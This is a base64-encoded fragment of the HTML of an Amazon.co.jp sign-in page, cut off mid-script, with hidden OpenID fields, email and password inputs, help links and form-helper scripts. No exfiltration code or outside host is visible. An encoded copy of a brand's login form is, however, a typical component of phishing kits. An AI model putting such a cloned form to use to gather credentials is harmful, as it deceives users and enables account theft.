ICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ib3BlbmlkLnJldHVybl90byIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWU9ImFwZTphSFIwY0hNNkx5OTNkM2N1WVcxaGVtOXVMbU52TG1wd0x6OXlaV1pmUFc1aGRsOWxiVjlvWkY5eVpWOXphV2R1YVc0PSIvPgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJwcmV2UklEIiB2YWx1ZT0iYXBlOk9FaFRXRGhIVnpKRFRWRklRakpJU2xZeVJ6WT0iLz4KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0id29ya2Zsb3dTdGF0ZSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWU9ImV5SjZhWEFpT2lKRVJVWWlMQ0psYm1NaU9pSkJNalUyUjBOTklpd2lZV3huSWpvaVFUSTFOa3RYSW4wLnpUb2N0Nlp1T2Qyb2FOX2JrTTRsVkpYOGhKN3MwNnVGMWpiUHpGS1ZvaWYxa2RPMnQ3Rk1Qdy5QS1hfOFRqRjRvaGlrNGFPLmUtWmhMWTEwX180TmhCY3dYZURPNXdFS3p1SlVQY29uRHJiYTNuRHJUSVhvVkJRbU4yNHNaNk5jb0xFdHBZa2RMNXFPdUhqSmpaVE16RlRwV1FCTnZDdUNkdXpkaUYzbExVVVBFSXhTWU1ta2tfMTFwd29fNGg4VWJvNWxXN3hhRmlaMVotYUFpN0Y4enJpdFhZMk5zYnBfdWhwcEhGajdpdVRveUtPZDU3M1NLUDY3dGlNeWRqWjNwU1A1U0h5Ukk3ZHhINzdRbFJIcHVDcURkZmpCOG1UYUhNYXpUWnVPelJSXzRBYVNGazVicVJxUGh6QjdPd0w3dDRxcUJZRTB2UHd2RGcyWWg5RFk2QTJsbTRqR1ZFd2UwQi04SURfU3oteHIwbEFDd1FtTmFIYUhKWG1rT2JoZktBXy00M25HZy0wcFlNOF8uUDJydjVVQ0dnOGRTQ3ZWSXRwYlZ6ZyIvPgoKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYS1zZWN0aW9uIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYS1ib3giPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYS1ib3gtaW5uZXIgYS1wYWRkaW5nLWV4dHJhLWxhcmdlIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aDEgY2xhc3M9ImEtc3BhY2luZy1zbWFsbCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOODreOCsOOCpOODswogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvaDE+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPCEtLSBvcHRpb25hbCBzdWJoZWFkaW5nIGVsZW1lbnQgLS0+CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImEtcm93IGEtc3BhY2luZy1iYXNlIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0iYXBfZW1haWwiIGNsYXNzPSJhLWZvcm0tbGFiZWwiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgReODoeODvOODq+OBvuOBn+OBr+aQuuW4r+mbu+ipseeVquWPtwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2xhYmVsPgoKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJlbWFpbCIgbWF4bGVuZ3RoPSIxMjgiIHZhbHVlPSIiIGlkPSJhcF9lbWFpbCIgbmFtZT0iZW1haWwiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YWJpbmRleD0iMSIgY2xhc3M9ImEtaW5wdXQtdGV4dCBhLXNwYW4xMiBhdXRoLXJlcXVpcmVkLWZpZWxkIi8+CgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBtYXhsZW5ndGg9IjEwMjQiIGlkPSJhcC1jcmVkZW50aWFsLWF1dG9maWxsLWhpbnQiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuYW1lPSJwYXNzd29yZCIgY2xhc3M9ImEtaW5wdXQtdGV4dCBoaWRlIi8+CgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBpZD0iYXV0aC1lbWFpbC1taXNzaW5nLWFsZXJ0IgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzPSJhLWJveCBhLWFsZXJ0LWlubGluZSBhLWFsZXJ0LWlubGluZS1lcnJvciBhdXRoLWlubGluZWQtZXJyb3ItbWVzc2FnZSBhLXNwYWNpbmctdG9wLW1pbmkiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXJpYS1saXZlPSJhc3NlcnRpdmUiIHJvbGU9ImFsZXJ0Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImEtYm94LWlubmVyIGEtYWxlcnQtY29udGFpbmVyIj48aQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0iYS1pY29uIGEtaWNvbi1hbGVydCI+PC9pPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImEtYWxlcnQtY29udGVudCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEXjg6Hjg7zjg6vjgqLjg4njg6zjgrnjgb7jgZ/jga/mkLrluK/pm7voqbHnlarlj7fjgpLlhaXlipsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjcmVhdGUiIHZhbHVlPSIwIi8+CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImEtc2VjdGlvbiI+CgogICAgICAgICAgICA8c3BhbiBpZD0iY29udGludWUiIGNsYXNzPSJhLWJ1dHRvbiBhLWJ1dHRvbi1zcGFuMTIgYS1idXR0b24tcHJpbWFyeSI+PHNwYW4gY2xhc3M9ImEtYnV0dG9uLWlubmVyIj48aW5wdXQKICAgICAgICAgICAgICAgICAgICBpZD0iY29udGludWUiIHRhYmluZGV4PSI1IiBjbGFzcz0iYS1idXR0b24taW5wdXQiIHR5cGU9InN1Ym1pdCIKICAgICAgICAgICAgICAgICAgICBhcmlhLWxhYmVsbGVkYnk9ImNvbnRpbnVlLWFubm91bmNlIi8+PHNwYW4gaWQ9ImNvbnRpbnVlLWFubm91bmNlIiBjbGFzcz0iYS1idXR0b24tdGV4dCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXJpYS1oaWRkZW49InRydWUiPgogICAgICAgICAgICAgIOasoeOBuOmAsuOCgAogICAgICAgICAgICA8L3NwYW4+PC9zcGFuPjwvc3Bhbj4KCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGlkPSJsZWdhbFRleHRSb3ciIGNsYXNzPSJhLXJvdyBhLXNwYWNpbmctdG9wLW1lZGl1bSBhLXNpemUtc21hbGwiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg57aa6KGM44GZ44KL44GT44Go44Gn44CBIEFtYXpvbuOBrjxhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaHJlZj0iaHR0cHM6Ly93d3cuYW1hem9uLmNvLmpwL2dwL2hlbHAvY3VzdG9tZXIvZGlzcGxheS5odG1sL3JlZj1hcF9zaWduaW5fbm90aWZpY2F0aW9uX2NvbmRpdGlvbl9vZl91c2U/aWU9VVRGOCZhbXA7bm9kZUlkPTY0MzAwNiI+5Yip55So6KaP57SEPC9hPuOBiuOCiOOBszxhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaHJlZj0iaHR0cHM6Ly93d3cuYW1hem9uLmNvLmpwL2dwL2hlbHAvY3VzdG9tZXIvZGlzcGxheS5odG1sL3JlZj1hcF9zaWduaW5fbm90aWZpY2F0aW9uX3ByaXZhY3lfbm90aWNlP2llPVVURjgmYW1wO25vZGVJZD02NDMwMDAiPuODl+ODqeOCpOODkOOCt+ODvOimj+e0hDwvYT7jgavlkIzmhI/jgZnjgovjgoLjga7jgajjgb/jgarjgZXjgozjgb7jgZnjgIIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNjcmlwdD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGNmKCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICh0eXBlb2Ygd2luZG93LnVldCA9PT0gJ2Z1bmN0aW9uJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1ZXQoJ2NmJyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICh3aW5kb3cuZW1iZWROb3RpZmljYXRpb24gJiYKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHlwZW9mIHdpbmRvdy5lbWJlZE5vdGlmaWNhdGlvbi5vbkNGID09PSAnZnVuY3Rpb24nKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVtYmVkTm90aWZpY2F0aW9uLm9uQ0YoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvc2NyaXB0PgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPmNmKCk8L3NjcmlwdD4KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJhLXNlY3Rpb24iPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGFyaWEtbGl2ZT0icG9saXRlIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzPSJhLXJvdyBhLWV4cGFuZGVyLWNvbnRhaW5lciBhLWV4cGFuZGVyLWlubGluZS1jb250YWluZXIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIiBkYXRhLWFjdGlvbj0iYS1leHBhbmRlci10b2dnbGUiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0iYS1leHBhbmRlci1oZWFkZXIgYS1kZWNsYXJhdGl2ZSBhLWV4cGFuZGVyLWlubGluZS1oZWFkZXIgYS1saW5rLWV4cGFuZGVyIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YS1hLWV4cGFuZGVyLXRvZ2dsZT0ieyZxdW90O2FsbG93TGlua0RlZmF1bHQmcXVvdDs6dHJ1ZSwgJnF1b3Q7ZXhwYW5kX3Byb21wdCZxdW90OzomcXVvdDsmcXVvdDssICZxdW90O2NvbGxhcHNlX3Byb21wdCZxdW90OzomcXVvdDsmcXVvdDt9Ij48aQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0iYS1pY29uIGEtaWNvbi1leHBhbmQiPjwvaT48c3BhbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0iYS1leHBhbmRlci1wcm9tcHQiPgogICAgICDjgYrlm7DjgorjgafjgZnjgYs/CiAgICA8L3NwYW4+PC9hPgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgYXJpYS1leHBhbmRlZD0iZmFsc2UiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzPSJhLWV4cGFuZGVyLWNvbnRlbnQgYS1leHBhbmRlci1pbmxpbmUtY29udGVudCBhLWV4cGFuZGVyLWlubmVyIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHlsZT0iZGlzcGxheTpub25lIj4KCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGlkPSJhdXRoLWZwcC1saW5rLWJvdHRvbSIgY2xhc3M9ImEtbGluay1ub3JtYWwiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaHJlZj0iaHR0cHM6Ly93d3cuYW1hem9uLmNvLmpwL2FwL2ZvcmdvdHBhc3N3b3JkP3Nob3dSZW1lbWJlck1lPXRydWUmYW1wO29wZW5pZC5wYXBlLm1heF9hdXRoX2FnZT0wJmFtcDtvcGVuaWQuaWRlbnRpdHk9aHR0cCUzQSUyRiUyRnNwZWNzLm9wZW5pZC5uZXQlMkZhdXRoJTJGMi4wJTJGaWRlbnRpZmllcl9zZWxlY3QmYW1wO3BhZ2VJZD1qcGZsZXgmYW1wO29wZW5pZC5yZXR1cm5fdG89aHR0cHMlM0ElMkYlMkZ3d3cuYW1hem9uLmNvLmpwJTJGJTNGcmVmXyUzRG5hdl9lbV9oZF9yZV9zaWduaW4mYW1wO3ByZXZSSUQ9OEhTWDhHVzJDTVFIQjJISlYyRzYmYW1wO29wZW5pZC5hc3NvY19oYW5kbGU9anBmbGV4JmFtcDtvcGVuaWQubW9kZT1jaGVja2lkX3NldHVwJmFtcDtwcmVwb3B1bGF0ZWRMb2dpbklkPWV5SmphWEJvWlhJaU9pSnFSM2RWYm5WeFMwbDFlSEU0WlROU1VFTnJSbkYzUFQwaUxDSjJaWEp6YVc5dUlqb3hMQ0pKVmlJNklpOTFWVmhUWW1KeVVEbHBUV2c0YjFwWWVXVnpWM2M5UFNKOSZhbXA7ZmFpbGVkU2lnbkluQ291bnQ9MCZhbXA7cmVmXz1uYXZfZW1faGRfY2xjX3NpZ25pbiZhbXA7b3BlbmlkLmNsYWltZWRfaWQ9aHR0cCUzQSUyRiUyRnNwZWNzLm9wZW5pZC5uZXQlMkZhdXRoJTJGMi4wJTJGaWRlbnRpZmllcl9zZWxlY3QmYW1wO29wZW5pZC5ucz1odHRwJTNBJTJGJTJGc3BlY3Mub3BlbmlkLm5ldCUyRmF1dGglMkYyLjAmYW1wO3RpbWVzdGFtcD0xNTgxMTI0Mzk1MDAwIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg44OR44K544Ov44O844OJ44KS5b+Y44KM44Gf5aC05ZCICiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBhcmlhLWV4cGFuZGVkPSJmYWxzZSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xhc3M9ImEtZXhwYW5kZXItY29udGVudCBhLWV4cGFuZGVyLWlubGluZS1jb250ZW50IGEtZXhwYW5kZXItaW5uZXIiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0eWxlPSJkaXNwbGF5Om5vbmUiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGlkPSJhcC1vdGhlci1zaWduaW4taXNzdWVzLWxpbmsiIGNsYXNzPSJhLWxpbmstbm9ybWFsIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhyZWY9Imh0dHBzOi8vd3d3LmFtYXpvbi5jby5qcC9ncC9oZWxwL2N1c3RvbWVyL2FjY291bnQtaXNzdWVzL3JlZj1hcF9sb2dpbl93aXRoX290cF9jbGFpbV9jb2xsZWN0aW9uP2llPVVURjgiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDjgZ3jga7ku5bjga7jg63jgrDjgqTjg7PjgavplqLjgZnjgovllY/poYwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZm9ybT4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CgoKICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYS1kaXZpZGVyIGEtZGl2aWRlci1icmVhayI+PGg1PkFtYXpvbuOBruaWsOOBl+OBhOOBiuWuouanmOOBp+OBmeOBi++8nzwvaDU+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIGlkPSJhdXRoLWNyZWF0ZS1hY2NvdW50LWxpbmsiIGNsYXNzPSJhLWJ1dHRvbiBhLWJ1dHRvbi1zcGFuMTIgYS1idXR0b24tYmFzZSI+PHNwYW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0iYS1idXR0b24taW5uZXIiPjxhIGlkPSJjcmVhdGVBY2NvdW50U3VibWl0IiB0YWJpbmRleD0iNiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhyZWY9Imh0dHBzOi8vd3d3LmFtYXpvbi5jby5qcC9hcC9yZWdpc3Rlcj9zaG93UmVtZW1iZXJNZT10cnVlJmFtcDtvcGVuaWQucGFwZS5tYXhfYXV0aF9hZ2U9MCZhbXA7b3BlbmlkLmlkZW50aXR5PWh0dHAlM0ElMkYlMkZzcGVjcy5vcGVuaWQubmV0JTJGYXV0aCUyRjIuMCUyRmlkZW50aWZpZXJfc2VsZWN0JmFtcDtwYWdlSWQ9anBmbGV4JmFtcDtvcGVuaWQucmV0dXJuX3RvPWh0dHBzJTNBJTJGJTJGd3d3LmFtYXpvbi5jby5qcCUyRiUzRnJlZl8lM0RuYXZfZW1faGRfcmVfc2lnbmluJmFtcDtwcmV2UklEPThIU1g4R1cyQ01RSEIySEpWMkc2JmFtcDtvcGVuaWQuYXNzb2NfaGFuZGxlPWpwZmxleCZhbXA7b3BlbmlkLm1vZGU9Y2hlY2tpZF9zZXR1cCZhbXA7ZmFpbGVkU2lnbkluQ291bnQ9MCZhbXA7cmVmXz1uYXZfZW1faGRfY2xjX3NpZ25pbiZhbXA7b3BlbmlkLmNsYWltZWRfaWQ9aHR0cCUzQSUyRiUyRnNwZWNzLm9wZW5pZC5uZXQlMkZhdXRoJTJGMi4wJTJGaWRlbnRpZmllcl9zZWxlY3QmYW1wO29wZW5pZC5ucz1odHRwJTNBJTJGJTJGc3BlY3Mub3BlbmlkLm5ldCUyRmF1dGglMkYyLjAmYW1wO3RpbWVzdGFtcD0xNTgxMTI0Mzk1MDAwIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xhc3M9ImEtYnV0dG9uLXRleHQiIHJvbGU9ImJ1dHRvbiI+CiAgICAgICAgICBBbWF6b27jgqLjgqvjgqbjg7Pjg4jjgpLkvZzmiJAKICAgICAgICA8L2E+PC9zcGFuPjwvc3Bhbj4KCgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgoKCiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CgoKICAgICAgICA8L2Rpdj4KCgogICAgICAgIDxkaXYgaWQ9InJpZ2h0LTIiPgogICAgICAgIDwvZGl2PgoKICAgICAgICA8ZGl2IGNsYXNzPSJhLXNlY3Rpb24gYS1zcGFjaW5nLXRvcC1leHRyYS1sYXJnZSBhdXRoLWZvb3RlciI+CgoKICAgICAgICAgICAgPGRpdiBjbGFzcz0iYS1kaXZpZGVyIGEtZGl2aWRlci1zZWN0aW9uIj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImEtZGl2aWRlci1pbm5lciI+PC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgPGRpdiBjbGFzcz0iYS1zZWN0aW9uIGEtc3BhY2luZy1zbWFsbCBhLXRleHQtY2VudGVyIGEtc2l6ZS1taW5pIj4KICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJhdXRoLWZvb3Rlci1zZXBlcmF0b3IiPjwvc3Bhbj4KCgogICAgICAgICAgICAgICAgPGEgY2xhc3M9ImEtbGluay1ub3JtYWwiIHRhcmdldD0iX2JsYW5rIgogICAgICAgICAgICAgICAgICAgaHJlZj0iaHR0cHM6Ly93d3cuYW1hem9uLmNvLmpwL2dwL2hlbHAvY3VzdG9tZXIvZGlzcGxheS5odG1sL3JlZj1hcF9kZXNrdG9wX2Zvb3Rlcl9jb3U/aWU9VVRGOCZhbXA7bm9kZUlkPTY0MzAwNiI+CiAgICAgICAgICAgICAgICAgICAg5Yip55So6KaP57SECiAgICAgICAgICAgICAgICA8L2E+CiAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0iYXV0aC1mb290ZXItc2VwZXJhdG9yIj48L3NwYW4+CgoKICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJhLWxpbmstbm9ybWFsIiB0YXJnZXQ9Il9ibGFuayIKICAgICAgICAgICAgICAgICAgIGhyZWY9Imh0dHBzOi8vd3d3LmFtYXpvbi5jby5qcC9ncC9oZWxwL2N1c3RvbWVyL2Rpc3BsYXkuaHRtbC9yZWY9YXBfZGVza3RvcF9mb290ZXJfcHJpdmFjeV9ub3RpY2U/aWU9VVRGOCZhbXA7bm9kZUlkPTY0MzAwMCI+CiAgICAgICAgICAgICAgICAgICAg44OX44Op44Kk44OQ44K344O86KaP57SECiAgICAgICAgICAgICAgICA8L2E+CiAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0iYXV0aC1mb290ZXItc2VwZXJhdG9yIj48L3NwYW4+CgoKICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJhLWxpbmstbm9ybWFsIiB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iaHR0cHM6Ly93d3cuYW1hem9uLmNvLmpwL2hlbHAiPgogICAgICAgICAgICAgICAgICAgIOODmOODq+ODlwogICAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImF1dGgtZm9vdGVyLXNlcGVyYXRvciI+PC9zcGFuPgoKCiAgICAgICAgICAgIDwvZGl2PgoKCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImEtc2VjdGlvbiBhLXNwYWNpbmctbm9uZSBhLXRleHQtY2VudGVyIj4KCgoKCgoKPHNwYW4gY2xhc3M9ImEtc2l6ZS1taW5pIGEtY29sb3Itc2Vjb25kYXJ5Ij4KICAmY29weTsgMTk5Ni0yMDIwLCBBbWF6b24uY29tLCBJbmMuIG9yIGl0cyBhZmZpbGlhdGVzCjwvc3Bhbj4KCiAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICA8L2Rpdj4KICAgIDwvZGl2PgoKICAgIDxkaXYgaWQ9ImF1dGgtZXh0ZXJuYWwtamF2YXNjcmlwdCIgY2xhc3M9ImF1dGgtZXh0ZXJuYWwtamF2YXNjcmlwdCIgZGF0YS1leHRlcm5hbC1qYXZhc2NyaXB0cz0iIj4KICAgIDwvZGl2PgoKCiAgICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgdmFyIG1ldGFkYXRhTGlzdCA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCdtZXRhZGF0YTEnKTsKICAgICAgICAgICAgaWYgKG1ldGFkYXRhTGlzdC5sZW5ndGggPT0gMCkgewogICAgICAgICAgICAgICAgdmFyIGlucHV0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaW5wdXQnKTsKICAgICAgICAgICAgICAgIGlucHV0Lm5hbWUgPSAnbWV0YWRhdGExJzsKICAgICAgICAgICAgICAgIGlucHV0LnR5cGUgPSAnaGlkZGVuJzsKICAgICAgICAgICAgICAgIGlucHV0LnZhbHVlID0gJ3RydWUnOwoKICAgICAgICAgICAgICAgIHZhciBhdXRoZW50aWNhdGlvbkZvcm1MaXN0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeU5hbWUoJ3NpZ25JbicpOwogICAgICAgICAgICAgICAgZm9yICh2YXIgaW5kZXggPSAwOyBpbmRleCA8IGF1dGhlbnRpY2F0aW9uRm9ybUxpc3QubGVuZ3RoOyBpbmRleCsrKSB7CiAgICAgICAgICAgICAgICAgICAgYXV0aGVudGljYXRpb25Gb3JtTGlzdFtpbmRleF0uYXBwZW5kQ2hpbGQoaW5wdXQpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgZm9yICh2YXIgaW5kZXggPSAwOyBpbmRleCA8IG1ldGFkYXRhTGlzdC5sZW5ndGg7IGluZGV4KyspIHsKICAgICAgICAgICAgICAgICAgICBtZXRhZGF0YUxpc3RbaW5kZXhdLnZhbHVlID0gJ3RydWUnOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICBpZiAodHlwZW9mIHdpbmRvdy51ZUxvZ0Vycm9yID09PSAnZnVuY3Rpb24nKSB7CiAgICAgICAgICAgICAgICB3aW5kb3cudWVMb2dFcnJvcihlLCB7CiAgICAgICAgICAgICAgICAgICAgbWVzc2FnZTogJ0ZhaWxlZCB0byBwb3B1bGF0ZSBkZWZhdWx0IG1ldGFkYXRhIHZhbHVlJywKICAgICAgICAgICAgICAgICAgICBsb2dMZXZlbDogJ3dhcm4nLAogICAgICAgICAgICAgICAgICAgIGF0dHJpYnV0aW9uOiAnRldDSU1Bc3NldHMnCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfQogICAgICAgI